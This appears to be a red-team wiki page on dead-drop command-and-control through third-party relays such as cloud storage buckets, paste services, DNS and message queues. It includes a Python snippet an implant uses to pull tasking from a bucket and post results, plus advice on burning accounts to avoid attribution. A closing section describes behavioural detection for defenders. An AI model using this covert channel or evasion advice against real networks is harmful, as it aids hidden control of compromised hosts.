# Reflector networks

The [WireGuard mesh](wireguard-mesh.md) and [onion services](tor-hidden.md) are infrastructure the operator builds
and controls. Reflector patterns are different: the relay is a legitimate third-party service the operator merely
uses, and the C2 traffic hides inside what looks like ordinary use of that service. An HTTP request to a cloud
storage bucket retrieving a tasking file looks, to every sensor between the implant and the bucket, like a file
download. The bucket's logs show a download. Both things are true.

The technique is sometimes called a dead drop: the operator writes to a shared location, the implant reads from
it, and the two ends never speak directly. The relay neither knows nor stores the relationship between writer and
reader.

## Common relay patterns

### Cloud storage and paste services

A blob in an S3-compatible bucket, a Gist, or a paste service holds the next task as an encrypted payload. The
implant polls on a schedule, decrypts, executes, and writes a response blob to a separate location. The operator
reads responses and writes the next task from an unrelated IP, often through a [CDN hop](../redirectors/cdn-fronting.md)
of their own.

The traffic at the implant end is HTTPS to a CDN hostname the target's network almost certainly allows. The
payload is encrypted and indistinguishable from any other object stored there.

```python
import boto3, base64

s3 = boto3.client("s3", endpoint_url="https://s3.<region>.backblazeb2.com")

def fetch_task(bucket, key):
    obj = s3.get_object(Bucket=bucket, Key=key)
    return base64.b64decode(obj["Body"].read())

def post_result(bucket, key, data):
    s3.put_object(Bucket=bucket, Key=key, Body=base64.b64encode(data))
```

The bucket registration wants an account, which returns to the [anonymous payments](payments.md) question. Burn the
account per operation; bucket naming and access patterns can accumulate indicators across engagements if reused.

### DNS as a relay

A DNS query carries data in the subdomain label. A controlled authoritative resolver reads the label as a
command channel and encodes the response in the answer. Every hop between the implant and the resolver sees a name
resolution request, which is among the least-inspected egress types in most networks.

This overlaps with the DNS transport in [protocol rotators](../redirectors/protocol-rotators.md). The distinction
here is the relay direction: a standard DNS-tunnel tool (iodine, dnscat2) handles both the encoding and the
authoritative side, so the controlled resolver is the reflector rather than a raw bouncer. The implant's traffic
touches no operator-controlled IP; the only visible address is the resolver handling the query, which is the
operator's nameserver fronting as a legitimate DNS authority.

### Managed message queues and APIs

Web APIs that accept and hold messages work as relays: MQTT brokers, cloud pub/sub services, and
webhook-forwarding services all let the operator write a tasking payload that the implant retrieves later. The
appeal is that the polling traffic looks like a connected device checking for updates, which is what most IoT and
CI tooling also does.

The operational discipline is the same as the storage pattern: separate accounts for write and read ends, encrypt
before posting, burn accounts per operation.

## Trade-offs

* The relay logs everything. A cloud storage provider, a paste service, and a DNS resolver all keep access logs
the operator cannot control and usually cannot inspect. The encryption covers the payload; the metadata (timing,
account, source IP) sits in logs the provider holds and may retain for longer than the operation runs.
* Rate limits and availability are outside the operator's control. A bucket gets throttled or a paste service
goes down mid-operation, and the channel goes quiet without warning.
* Account creation trails survive the operation. A Gist account or cloud bucket provisioned for an engagement
exists in the provider's records after teardown. Linking an engagement back to an account is the defender's
problem to solve, but it is a solvable one.
* The pattern invites a specific detection angle. A process polling a cloud storage endpoint on a fixed schedule,
downloading encrypted blobs, is indistinguishable by content and distinctive by behaviour. Frequency analysis and
per-host API call baselining surface the rhythm even when the payload stays opaque.

## What the defender does with it

Content inspection misses this almost entirely. The useful signal is behavioural: a host that polls a cloud
endpoint at a regular interval, a process that downloads objects with high entropy and immediately spawns child
processes, a DNS resolver receiving subdomains of consistent length and character distribution. Most of these
reads are available from egress proxy logs, DNS logs, and endpoint telemetry without touching the payload. A paste
service or storage bucket accessed by a single internal host and by an IP that geolocates to a different continent
within seconds of each other is the kind of pattern correlation catches and content analysis misses entirely.
